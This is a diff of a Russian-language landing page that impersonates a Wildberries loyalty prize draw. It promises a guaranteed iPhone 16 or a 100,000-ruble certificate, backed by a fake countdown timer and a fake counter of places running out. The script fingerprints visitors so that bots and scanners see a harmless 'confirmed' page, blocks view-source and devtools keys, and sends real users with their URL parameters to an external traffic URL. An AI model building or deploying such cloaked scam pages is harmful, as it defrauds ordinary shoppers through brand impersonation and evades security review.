@@ -10,20 +10,18 @@
         :root {
             --wb-purple: #9360c8;
             --wb-purple-dark: #7b4db5;
-            --wb-purple-light: rgba(147, 96, 200, 0.08);
-            --wb-purple-border: rgba(147, 96, 200, 0.2);
-            --wb-gradient: linear-gradient(135deg, #9360c8, #a64dff);
-            --bg: #f5f5f7;
+            --bg: #f8f8fa;
             --card-bg: #ffffff;
-            --card-border: #e8e8ed;
-            --text: #1d1d1f;
-            --sub: #6e6e73;
-            --gold: #d4a843;
-            --gold-bg: rgba(212, 168, 67, 0.08);
-            --gold-border: rgba(212, 168, 67, 0.25);
-            --red-accent: #f5515c;
+            --text: #1a1a1a;
+            --sub: #8e8e93;
+            --border: #ececf0;
+            --gold: #c7973e;
+            --gold-light: rgba(199, 151, 62, 0.08);
+            --green: #34c759;
+            --green-bg: rgba(52, 199, 89, 0.08);
+            --red: #e54545;
+            --red-bg: rgba(229, 69, 69, 0.06);
             --radius: 16px;
-            --shadow: 0 2px 4px rgba(0,0,0,0.04), 0 8px 24px rgba(0,0,0,0.07);
         }
         
         * {
@@ -48,33 +46,43 @@
         
         .container {
             width: 100%;
-            max-width: 430px;
+            max-width: 400px;
         }
         
-        /* Шапка с логотипом */
-        .header {
+        /* Карточка */
+        .card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 32px 24px 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03), 0 8px 28px rgba(0,0,0,0.06);
             text-align: center;
-            margin-bottom: 8px;
         }
         
-        .header-badge {
+        /* Статусная строка */
+        .status-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .status-badge {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
-            background: var(--wb-purple-light);
-            border: 1px solid var(--wb-purple-border);
-            border-radius: 30px;
-            padding: 8px 18px;
-            font-size: 13px;
-            color: var(--wb-purple-dark);
+            gap: 6px;
+            background: var(--green-bg);
+            border-radius: 20px;
+            padding: 6px 14px;
+            font-size: 12px;
+            color: var(--green);
             font-weight: 600;
-            margin-bottom: 16px;
         }
         
-        .badge-dot {
-            width: 8px;
-            height: 8px;
-            background: var(--wb-purple);
+        .status-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--green);
             border-radius: 50%;
             animation: pulse 2s infinite;
         }
@@ -84,267 +92,175 @@
             50% { opacity: 0.3; transform: scale(0.7); }
         }
         
-        /* Основная карточка */
-        .main-card {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            border-radius: var(--radius);
-            padding: 28px 20px 22px;
-            box-shadow: var(--shadow);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        /* Декоративная полоса сверху */
-        .main-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: var(--wb-gradient);
-        }
-        
-        /* Секция с суммой/призом */
-        .prize-section {
-            text-align: center;
-            margin-bottom: 8px;
-        }
-        
-        .prize-crown {
-            font-size: 42px;
-            margin-bottom: 8px;
-            animation: float 2.5s ease-in-out infinite;
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-        
-        .prize-ribbon {
-            display: inline-block;
-            background: var(--red-accent);
-            color: #ffffff;
+        /* ID профиля */
+        .profile-id {
             font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-            padding: 6px 16px;
-            border-radius: 20px;
-            margin-bottom: 16px;
+            color: var(--sub);
+            margin-bottom: 20px;
+            letter-spacing: 0.02em;
         }
         
-        .prize-heading {
-            font-size: 24px;
+        .profile-id span {
+            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+            font-weight: 500;
+            color: #6e6e73;
+        }
+        
+        /* Логотип */
+        .logo {
+            width: 44px;
+            height: 44px;
+            margin: 0 auto 16px;
+            background: var(--wb-purple);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+        }
+        
+        /* Заголовок */
+        .title {
+            font-size: 22px;
             font-weight: 700;
             color: var(--text);
-            letter-spacing: -0.02em;
-            line-height: 1.25;
+            letter-spacing: -0.03em;
+            line-height: 1.2;
             margin-bottom: 6px;
         }
         
-        .prize-heading .highlight {
-            background: linear-gradient(135deg, var(--wb-purple), #a64dff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+        .title span {
+            color: var(--wb-purple);
         }
         
-        .prize-subhead {
+        .subtitle {
             font-size: 14px;
             color: var(--sub);
-            margin-bottom: 20px;
             line-height: 1.4;
+            margin-bottom: 20px;
         }
         
-        /* Блок с гарантированными призами */
-        .prizes-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
+        /* Призы */
+        .prizes-row {
+            display: flex;
             gap: 8px;
-            margin-bottom: 18px;
+            margin-bottom: 20px;
         }
         
-        .prize-item {
-            background: var(--gold-bg);
-            border: 1px solid var(--gold-border);
+        .prize-chip {
+            flex: 1;
+            background: var(--gold-light);
             border-radius: 10px;
-            padding: 12px 6px;
+            padding: 12px 8px;
             text-align: center;
         }
         
-        .prize-item-icon {
-            font-size: 26px;
+        .prize-chip-icon {
+            font-size: 24px;
             margin-bottom: 4px;
         }
         
-        .prize-item-name {
+        .prize-chip-name {
             font-size: 11px;
             color: var(--text);
             font-weight: 600;
-            line-height: 1.3;
+            line-height: 1.2;
         }
         
-        .prize-item-value {
+        .prize-chip-value {
             font-size: 10px;
             color: var(--gold);
             font-weight: 700;
             margin-top: 2px;
         }
         
-        /* Секция "Как это работает" */
-        .steps-section {
-            margin-bottom: 18px;
-        }
-        
-        .steps-title {
-            font-size: 13px;
-            color: var(--sub);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            font-weight: 600;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        
-        .step-row {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 8px 0;
-        }
-        
-        .step-num {
-            width: 28px;
-            height: 28px;
-            min-width: 28px;
-            background: var(--wb-purple);
-            color: #ffffff;
-            border-radius: 50%;
+        /* Счётчик мест */
+        .counter-block {
+            background: var(--red-bg);
+            border-radius: 10px;
+            padding: 10px 14px;
+            margin-bottom: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 13px;
-            font-weight: 700;
-        }
-        
-        .step-text {
-            font-size: 13px;
-            color: var(--text);
-            line-height: 1.3;
-        }
-        
-        .step-text small {
-            color: var(--sub);
-            font-size: 11px;
-        }
-        
-        /* Таймер */
-        .timer-block {
-            background: linear-gradient(135deg, #fef9f0, #fdf5e6);
-            border: 1px solid var(--gold-border);
-            border-radius: 10px;
-            padding: 14px 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 16px;
-        }
-        
-        .timer-left {
-            display: flex;
-            align-items: center;
             gap: 8px;
         }
         
-        .timer-icon {
-            font-size: 20px;
+        .counter-icon {
+            font-size: 16px;
         }
         
-        .timer-info {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .timer-label {
-            font-size: 12px;
-            color: var(--sub);
+        .counter-text {
+            font-size: 13px;
+            color: var(--text);
             font-weight: 500;
         }
         
-        .timer-urgency {
-            font-size: 11px;
-            color: var(--red-accent);
+        .counter-text strong {
+            color: var(--red);
+            font-weight: 700;
+        }
+        
+        /* Гарантия */
+        .guarantee {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #eef7ee;
+            border-radius: 20px;
+            padding: 6px 14px;
+            font-size: 12px;
+            color: #2d7a2d;
             font-weight: 600;
+            margin-bottom: 18px;
+        }
+        
+        /* Таймер */
+        .timer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .timer-icon {
+            font-size: 16px;
+        }
+        
+        .timer-label {
+            font-size: 13px;
+            color: var(--sub);
         }
         
         .timer-value {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 700;
             color: var(--text);
             font-variant-numeric: tabular-nums;
             font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
-            letter-spacing: 0.04em;
+            letter-spacing: 0.03em;
         }
         
         .timer-value.urgent {
-            color: var(--red-accent);
-            animation: blink 1s infinite;
+            color: var(--red);
         }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        /* Счетчик участников */
-        .counter-block {
-            text-align: center;
-            margin-bottom: 16px;
-            font-size: 12px;
-            color: var(--sub);
-        }
-        
-        .counter-block strong {
-            color: var(--red-accent);
-            font-weight: 700;
-        }
-        
-        .counter-dots {
-            display: flex;
-            justify-content: center;
-            gap: 4px;
-            margin-top: 6px;
-        }
-        
-        .counter-dot {
-            width: 6px;
-            height: 6px;
-            background: var(--wb-purple);
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-        
-        .counter-dot:nth-child(2) { animation-delay: 0.2s; }
-        .counter-dot:nth-child(3) { animation-delay: 0.4s; }
-        .counter-dot:nth-child(4) { animation-delay: 0.6s; }
-        .counter-dot:nth-child(5) { animation-delay: 0.8s; }
         
         /* Кнопка */
-        .btn-main {
+        .btn {
             display: block;
             width: 100%;
-            padding: 18px;
-            background: var(--wb-gradient);
+            padding: 16px;
+            background: var(--wb-purple);
             color: #ffffff;
             border: none;
             border-radius: 12px;
-            font-size: 17px;
-            font-weight: 700;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            transition: transform 0.1s ease, box-shadow 0.2s ease;
             -webkit-appearance: none;
             -moz-appearance: none;
             appearance: none;
@@ -352,74 +268,56 @@
             -webkit-tap-highlight-color: transparent;
             user-select: none;
             -webkit-user-select: none;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 4px 16px rgba(147, 96, 200, 0.35);
-            text-align: center;
+            transition: transform 0.1s ease, box-shadow 0.15s ease, background 0.15s ease;
+            box-shadow: 0 4px 14px rgba(147, 96, 200, 0.3);
         }
         
-        .btn-main:active {
+        .btn:active {
             transform: scale(0.97);
-            box-shadow: 0 6px 24px rgba(147, 96, 200, 0.5);
+            background: var(--wb-purple-dark);
+            box-shadow: 0 6px 20px rgba(147, 96, 200, 0.45);
         }
         
-        .btn-main.loading {
+        .btn.loading {
             pointer-events: none;
-            opacity: 0.85;
+            opacity: 0.8;
         }
         
-        .btn-main .spinner-btn {
+        .btn .spinner {
             display: none;
-            width: 24px;
-            height: 24px;
-            border: 2.5px solid rgba(255,255,255,0.3);
-            border-top: 2.5px solid #ffffff;
+            width: 22px;
+            height: 22px;
+            border: 2px solid rgba(255,255,255,0.25);
+            border-top: 2px solid #ffffff;
             border-radius: 50%;
             animation: spin 0.6s linear infinite;
             margin: 0 auto;
         }
         
-        .btn-main.loading .btn-text { display: none; }
-        .btn-main.loading .spinner-btn { display: block; }
+        .btn.loading .btn-text { display: none; }
+        .btn.loading .spinner { display: block; }
         
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
         
-        .btn-sub {
-            text-align: center;
+        .btn-hint {
             font-size: 11px;
-            color: var(--sub);
-            margin-top: 8px;
-            line-height: 1.4;
-        }
-        
-        /* Бейдж "Гарантировано" */
-        .guarantee-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #e8f5e9;
-            border: 1px solid #c8e6c9;
-            color: #2e7d32;
-            font-size: 12px;
-            font-weight: 600;
-            padding: 6px 12px;
-            border-radius: 20px;
-            margin-top: 4px;
+            color: #b0b0b8;
+            margin-top: 10px;
         }
         
         /* Футер */
-        .footer-note {
+        .footer {
             text-align: center;
             font-size: 10px;
-            color: #aeaeb2;
-            margin-top: 16px;
+            color: #c0c0c8;
+            margin-top: 18px;
             line-height: 1.5;
         }
         
-        /* Начальный лоадер */
-        .initial-loader {
+        /* Лоадер */
+        .loader-wrap {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -427,271 +325,195 @@
             padding: 40px 20px;
             background: var(--card-bg);
             border-radius: var(--radius);
-            box-shadow: var(--shadow);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03), 0 8px 28px rgba(0,0,0,0.06);
         }
         
-        .initial-loader .spinner {
-            width: 36px;
-            height: 36px;
-            border: 3px solid #e8e8ed;
+        .loader-spin {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #ececf0;
             border-top: 3px solid var(--wb-purple);
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
         
-        .initial-loader .loading-text {
+        .loader-text {
             font-size: 14px;
             color: var(--sub);
-            font-weight: 500;
         }
         
-        /* Анимация появления */
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(12px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        /* Анимация */
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
-        .fade-in {
+        .fade {
             opacity: 0;
-            animation: fadeInUp 0.5s ease forwards;
+            animation: fadeUp 0.4s ease forwards;
         }
-        
-        .fade-d1 { animation-delay: 0.05s; }
-        .fade-d2 { animation-delay: 0.12s; }
-        .fade-d3 { animation-delay: 0.20s; }
-        .fade-d4 { animation-delay: 0.28s; }
-        .fade-d5 { animation-delay: 0.36s; }
-        .fade-d6 { animation-delay: 0.44s; }
-        .fade-d7 { animation-delay: 0.52s; }
+        .f1 { animation-delay: 0.05s; }
+        .f2 { animation-delay: 0.12s; }
+        .f3 { animation-delay: 0.20s; }
+        .f4 { animation-delay: 0.28s; }
+        .f5 { animation-delay: 0.36s; }
+        .f6 { animation-delay: 0.44s; }
+        .f7 { animation-delay: 0.52s; }
+        .f8 { animation-delay: 0.60s; }
         
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-container">
-        <!-- Начальный лоадер -->
-        <div class="initial-loader" id="initial-loader">
-            <div class="spinner"></div>
-            <div class="loading-text">Загрузка программы лояльности...</div>
+    <div class="container" id="app">
+        
+        <!-- Лоадер -->
+        <div class="loader-wrap" id="loader">
+            <div class="loader-spin"></div>
+            <div class="loader-text">Загрузка...</div>
         </div>
         
-        <!-- Основной контент -->
-        <div id="main-content" style="display: none;">
-            
-            <!-- Шапка -->
-            <div class="header fade-in fade-d1">
-                <div class="header-badge">
-                    <span class="badge-dot"></span>
-                    Программа лояльности
-                </div>
-            </div>
-            
-            <!-- Основная карточка -->
-            <div class="main-card">
+        <!-- Контент -->
+        <div id="content" style="display:none;">
+            <div class="card">
                 
-                <!-- Секция с призом -->
-                <div class="prize-section fade-in fade-d2">
-                    <div class="prize-crown">👑</div>
-                    <div class="prize-ribbon">VIP-РОЗЫГРЫШ</div>
-                    <h1 class="prize-heading">
-                        <span class="highlight">Гарантированный</span> подарок ждёт вас
-                    </h1>
-                    <p class="prize-subhead">
-                        Вы попали в закрытый список участников. Только 500 человек допущены к этому розыгрышу.
-                    </p>
-                </div>
-                
-                <!-- Сетка призов -->
-                <div class="prizes-grid fade-in fade-d3">
-                    <div class="prize-item">
-                        <div class="prize-item-icon">📱</div>
-                        <div class="prize-item-name">iPhone 16</div>
-                        <div class="prize-item-value">Главный приз</div>
-                    </div>
-                    <div class="prize-item">
-                        <div class="prize-item-icon">💳</div>
-                        <div class="prize-item-name">Сертификат</div>
-                        <div class="prize-item-value">100 000 ₽</div>
-                    </div>
-                    <div class="prize-item">
-                        <div class="prize-item-icon">🎁</div>
-                        <div class="prize-item-name">Призовой бокс</div>
-                        <div class="prize-item-value">Всем участникам</div>
+                <!-- Статус-бар -->
+                <div class="status-bar fade f1">
+                    <div class="status-badge">
+                        <span class="status-dot"></span>
+                        Окно открыто
                     </div>
                 </div>
                 
-                <!-- Как это работает -->
-                <div class="steps-section fade-in fade-d4">
-                    <div class="steps-title">Как получить подарок</div>
-                    <div class="step-row">
-                        <div class="step-num">1</div>
-                        <div class="step-text">Нажмите кнопку «Крутить колесо» ниже</div>
+                <!-- ID профиля из письма -->
+                <div class="profile-id fade f1">
+                    Профиль <span id="profile-ref">WB-3472</span>
+                </div>
+                
+                <div class="logo fade f2">WB</div>
+                
+                <h1 class="title fade f3">
+                    Вы в <span>списке</span> участников
+                </h1>
+                <p class="subtitle fade f3">
+                    Закрытый розыгрыш призов для покупателей Wildberries. Гарантированный подарок каждому.
+                </p>
+                
+                <!-- Призы -->
+                <div class="prizes-row fade f4">
+                    <div class="prize-chip">
+                        <div class="prize-chip-icon">📱</div>
+                        <div class="prize-chip-name">iPhone 16</div>
+                        <div class="prize-chip-value">Главный</div>
                     </div>
-                    <div class="step-row">
-                        <div class="step-num">2</div>
-                        <div class="step-text">Запустите колесо фортуны <small>(займёт 10 секунд)</small></div>
+                    <div class="prize-chip">
+                        <div class="prize-chip-icon">💳</div>
+                        <div class="prize-chip-name">Сертификат</div>
+                        <div class="prize-chip-value">100 000 ₽</div>
                     </div>
-                    <div class="step-row">
-                        <div class="step-num">3</div>
-                        <div class="step-text">Гарантированно получите приз <small>+ шанс на суперприз</small></div>
+                    <div class="prize-chip">
+                        <div class="prize-chip-icon">🎁</div>
+                        <div class="prize-chip-name">Бокс</div>
+                        <div class="prize-chip-value">Каждому</div>
                     </div>
+                </div>
+                
+                <!-- Счётчик мест -->
+                <div class="counter-block fade f5">
+                    <span class="counter-icon">🔥</span>
+                    <span class="counter-text">
+                        Осталось <strong id="spots-left">14</strong> из 500 мест
+                    </span>
+                </div>
+                
+                <!-- Гарантия -->
+                <div class="guarantee fade f5">
+                    ✅ Каждый участник получает приз
                 </div>
                 
                 <!-- Таймер -->
-                <div class="timer-block fade-in fade-d5">
-                    <div class="timer-left">
-                        <span class="timer-icon">⏳</span>
-                        <div class="timer-info">
-                            <span class="timer-label">Окно розыгрыша</span>
-                            <span class="timer-urgency">закроется автоматически</span>
-                        </div>
-                    </div>
-                    <span class="timer-value" id="timer-display">01:59:47</span>
-                </div>
-                
-                <!-- Счетчик -->
-                <div class="counter-block fade-in fade-d5">
-                    Уже участвуют: <strong id="counter-value">347</strong> из 500 человек
-                    <div class="counter-dots">
-                        <span class="counter-dot"></span>
-                        <span class="counter-dot"></span>
-                        <span class="counter-dot"></span>
-                        <span class="counter-dot"></span>
-                        <span class="counter-dot"></span>
-                    </div>
+                <div class="timer fade f6">
+                    <span class="timer-icon">⏳</span>
+                    <span class="timer-label">До закрытия:</span>
+                    <span class="timer-value" id="timer">01:59:47</span>
                 </div>
                 
                 <!-- Кнопка -->
-                <button class="btn-main fade-in fade-d6" id="confirm-btn" onclick="handleProceed()">
-                    <span class="btn-text">🎰 Крутить колесо фортуны</span>
-                    <span class="spinner-btn"></span>
+                <button class="btn fade f7" id="main-btn" onclick="handleClick()">
+                    <span class="btn-text">Принять участие</span>
+                    <span class="spinner"></span>
                 </button>
                 
-                <!-- Гарантия -->
-                <div class="btn-sub fade-in fade-d6" style="text-align:center;margin-top:10px;">
-                    <span class="guarantee-badge">✅ Гарантированный приз каждому участнику</span>
+                <div class="btn-hint fade f7">
+                    Это займёт меньше минуты
                 </div>
                 
             </div>
             
-            <!-- Футер -->
-            <div class="footer-note fade-in fade-d7">
+            <div class="footer fade f8">
                 🔒 Безопасное соединение<br>
-                Программа лояльности Wildberries &bull; 2026<br>
-                <span>Автоматическая система распределения призов</span>
+                Программа лояльности &bull; 2026
             </div>
-            
         </div>
+        
     </div>
 
     <script>
     // ============================================
-    // КОНФИГУРАЦИЯ
+    // НАСТРОЙКИ
     // ============================================
-    const FINAL_OFFER_URL = 'https://world-mining.pro/traff.php';
-    const DELAY_BEFORE_SHOW = 2000;
-    
-    // Таймер: 2 часа в секундах
-    let remainingSeconds = 2 * 3600;
+    var FINAL_URL = 'https://world-mining.pro/traff.php'; // ← ЗАМЕНИ
+    var LOADER_DELAY = 2000;
+    var TIMER_SECONDS = 7200; // 2 часа
     
     // ============================================
-    // ПОЛУЧЕНИЕ ПАРАМЕТРОВ
+    // ПАРАМЕТРЫ ИЗ URL
     // ============================================
     function getParams() {
-        const params = new URLSearchParams(window.location.search);
+        var params = new URLSearchParams(window.location.search);
         return {
-            token: params.get('token') || params.get('id') || '',
-            all: window.location.search
+            token: params.get('token') || params.get('id') || params.get('d') || '',
+            all: window.location.search || ''
         };
     }
-    const urlParams = getParams();
+    var urlParams = getParams();
     
     // ============================================
-    // СЧЕТЧИК УЧАСТНИКОВ (динамический)
+    // ГЕНЕРАЦИЯ ID ПРОФИЛЯ
     // ============================================
-    function updateCounter() {
-        const el = document.getElementById('counter-value');
-        if (!el) return;
-        const base = 340;
-        const add = Math.floor(Math.random() * 15);
-        el.textContent = base + add;
-    }
-    
-    // Обновляем счетчик каждые 8-15 секунд
-    let counterInterval;
-    function startCounterUpdates() {
-        updateCounter();
-        counterInterval = setInterval(function() {
-            updateCounter();
-        }, 8000 + Math.floor(Math.random() * 7000));
-    }
-    
-    // ============================================
-    // ТАЙМЕР
-    // ============================================
-    let timerInterval;
-    
-    function formatTime(h, m, s) {
-        return String(h).padStart(2, '0') + ':' + 
-               String(m).padStart(2, '0') + ':' + 
-               String(s).padStart(2, '0');
-    }
-    
-    function updateTimer() {
-        const h = Math.floor(remainingSeconds / 3600);
-        const m = Math.floor((remainingSeconds % 3600) / 60);
-        const s = remainingSeconds % 60;
-        const display = document.getElementById('timer-display');
-        display.textContent = formatTime(h, m, s);
-        
-        if (remainingSeconds < 600) {
-            display.classList.add('urgent');
+    function generateProfileId() {
+        if (urlParams.token) {
+            return 'WB-' + urlParams.token.substring(0, 4).toUpperCase();
         }
-    }
-    
-    function startTimer() {
-        updateTimer();
-        timerInterval = setInterval(function() {
-            remainingSeconds--;
-            if (remainingSeconds <= 0) {
-                clearInterval(timerInterval);
-                document.getElementById('timer-display').textContent = '00:00:00';
-                document.getElementById('timer-display').classList.add('urgent');
-                return;
-            }
-            updateTimer();
-        }, 1000);
+        var chars = '0123456789ABCDEFGHJKLMNPQRSTUVWXYZ';
+        var id = '';
+        for (var i = 0; i < 4; i++) {
+            id += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return 'WB-' + id;
     }
     
     // ============================================
-    // ПРОВЕРКА БОТ/ЧЕЛОВЕК
+    // ПРОВЕРКА НА БОТА
     // ============================================
-    let isRealUser = false;
-    
-    function checkRealUser() {
+    function isRealUser() {
         if (navigator.webdriver === true) return false;
         if (!navigator.languages || navigator.languages.length === 0) return false;
         if (screen.width < 150 || screen.height < 150) return false;
-        if ((screen.width === 1 && screen.height === 1) || 
-            (screen.width === 0 && screen.height === 0)) return false;
+        if ((screen.width === 1 && screen.height === 1) || (screen.width === 0 && screen.height === 0)) return false;
         
-        const isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        const hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
-        const hasAccelerometer = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
+        var ua = navigator.userAgent;
+        var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+        var hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
+        var hasMotion = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
         
-        if (isMobileUA && (hasTouch || hasAccelerometer)) return true;
+        if (isMobile && (hasTouch || hasMotion)) return true;
         
-        if (!isMobileUA) {
-            const hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
-            const hasMimeTypes = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
-            const hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
-            if (!hasPlugins && !hasMimeTypes && !hasChrome) return false;
+        if (!isMobile) {
+            var hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
+            var hasMime = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
+            var hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
+            if (!hasPlugins && !hasMime && !hasChrome) return false;
             if (navigator.hardwareConcurrency === 0) return false;
         }
         
@@ -699,64 +521,125 @@
     }
     
     // ============================================
-    // ОТОБРАЖЕНИЕ
+    // НЕЙТРАЛЬНАЯ СТРАНИЦА ДЛЯ БОТОВ
     // ============================================
-    function showNeutralPage() {
-        document.getElementById('initial-loader').style.display = 'none';
-        const mc = document.getElementById('main-content');
-        mc.style.display = 'block';
-        mc.innerHTML = `
-            <div class="header">
-                <div class="header-badge">
-                    <span class="badge-dot"></span>
-                    Программа лояльности
-                </div>
-            </div>
-            <div class="main-card" style="text-align:center;">
-                <div style="font-size:48px;margin-bottom:16px;">✓</div>
-                <h2 style="font-weight:600;font-size:19px;color:#1d1d1f;margin-bottom:8px;">Статус подтверждён</h2>
-                <p style="font-size:14px;color:#6e6e73;">Ваша заявка обработана. Информация о розыгрыше будет отправлена дополнительно.</p>
-            </div>
-        `;
+    function showNeutral() {
+        document.getElementById('loader').style.display = 'none';
+        var c = document.getElementById('content');
+        c.style.display = 'block';
+        c.innerHTML = '<div class="card" style="text-align:center;"><div style="font-size:40px;margin-bottom:12px;">✓</div><h2 style="font-weight:600;font-size:18px;color:#1a1a1a;margin-bottom:6px;">Подтверждено</h2><p style="font-size:14px;color:#8e8e93;">Ваша заявка обработана.</p></div>';
     }
     
-    function showRealContent() {
-        isRealUser = true;
-        document.getElementById('initial-loader').style.display = 'none';
-        document.getElementById('main-content').style.display = 'block';
+    // ============================================
+    // ПОКАЗ РЕАЛЬНОГО КОНТЕНТА
+    // ============================================
+    var userIsReal = false;
+    
+    function showReal() {
+        userIsReal = true;
+        
+        // Устанавливаем ID профиля
+        document.getElementById('profile-ref').textContent = generateProfileId();
+        
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('content').style.display = 'block';
+        
         startTimer();
-        startCounterUpdates();
+        startSpotCounter();
+    }
+    
+    // ============================================
+    // ТАЙМЕР
+    // ============================================
+    var remaining = TIMER_SECONDS;
+    var timerInterval;
+    
+    function pad(n) {
+        return n < 10 ? '0' + n : '' + n;
+    }
+    
+    function updateTimer() {
+        var h = Math.floor(remaining / 3600);
+        var m = Math.floor((remaining % 3600) / 60);
+        var s = remaining % 60;
+        var el = document.getElementById('timer');
+        el.textContent = pad(h) + ':' + pad(m) + ':' + pad(s);
+        if (remaining < 600) el.classList.add('urgent');
+    }
+    
+    function startTimer() {
+        updateTimer();
+        timerInterval = setInterval(function() {
+            remaining--;
+            if (remaining <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('timer').textContent = '00:00:00';
+                document.getElementById('timer').classList.add('urgent');
+                return;
+            }
+            updateTimer();
+        }, 1000);
+    }
+    
+    // ============================================
+    // СЧЁТЧИК ОСТАВШИХСЯ МЕСТ
+    // ============================================
+    var spotsRemaining = 14;
+    var spotInterval;
+    
+    function updateSpotCounter() {
+        var el = document.getElementById('spots-left');
+        if (!el) return;
+        
+        // Каждые 20-40 секунд уменьшаем на 1
+        if (spotsRemaining > 1) {
+            spotsRemaining--;
+            el.textContent = spotsRemaining;
+        }
+        
+        // Когда осталось 3 или меньше — добавляем класс для акцента
+        if (spotsRemaining <= 3) {
+            el.style.color = '#e54545';
+        }
+    }
+    
+    function startSpotCounter() {
+        document.getElementById('spots-left').textContent = spotsRemaining;
+        
+        spotInterval = setInterval(function() {
+            updateSpotCounter();
+        }, 20000 + Math.floor(Math.random() * 20000)); // 20-40 секунд
     }
     
     // ============================================
     // КНОПКА
     // ============================================
-    function handleProceed() {
-        if (!isRealUser) return;
+    function handleClick() {
+        if (!userIsReal) return;
         
-        const btn = document.getElementById('confirm-btn');
+        var btn = document.getElementById('main-btn');
         btn.classList.add('loading');
         
         if (timerInterval) clearInterval(timerInterval);
-        if (counterInterval) clearInterval(counterInterval);
+        if (spotInterval) clearInterval(spotInterval);
         
         setTimeout(function() {
-            window.location.href = FINAL_OFFER_URL + urlParams.all;
+            window.location.href = FINAL_URL + urlParams.all;
         }, 700);
     }
     
-    window.handleProceed = handleProceed;
+    window.handleClick = handleClick;
     
     // ============================================
-    // ИНИЦИАЛИЗАЦИЯ
+    // ЗАПУСК
     // ============================================
     setTimeout(function() {
-        if (checkRealUser()) {
-            showRealContent();
+        if (isRealUser()) {
+            showReal();
         } else {
-            showNeutralPage();
+            showNeutral();
         }
-    }, DELAY_BEFORE_SHOW);
+    }, LOADER_DELAY);
     
     // ============================================
     // ЗАЩИТЫ
@@ -767,21 +650,16 @@
     });
     
     document.addEventListener('keydown', function(e) {
-        if (
-            (e.ctrlKey && e.key === 'u') ||
-            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-            e.key === 'F12'
-        ) {
+        if ((e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
             e.preventDefault();
             return false;
         }
     });
     
     if (window.top !== window.self) {
-        document.getElementById('initial-loader').style.display = 'none';
-        showNeutralPage();
+        document.getElementById('loader').style.display = 'none';
+        showNeutral();
     }
-    
     </script>
 
 </body>
